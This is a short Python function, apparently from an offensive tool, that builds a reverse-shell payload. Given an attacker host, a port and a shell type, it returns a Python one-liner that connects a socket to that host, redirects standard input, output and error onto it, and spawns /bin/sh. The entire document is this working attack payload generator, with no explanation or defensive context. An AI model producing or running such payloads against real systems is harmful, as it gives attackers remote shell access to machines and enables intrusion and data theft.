def command(lhost: str, lport: int, shell_type: str):
    payloads = {"python": f"python -c \"import socket,os,pty;s=socket.socket();s.connect(('{lhost}',{lport}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/sh')\""}
    return payloads.get(shell_type, "")
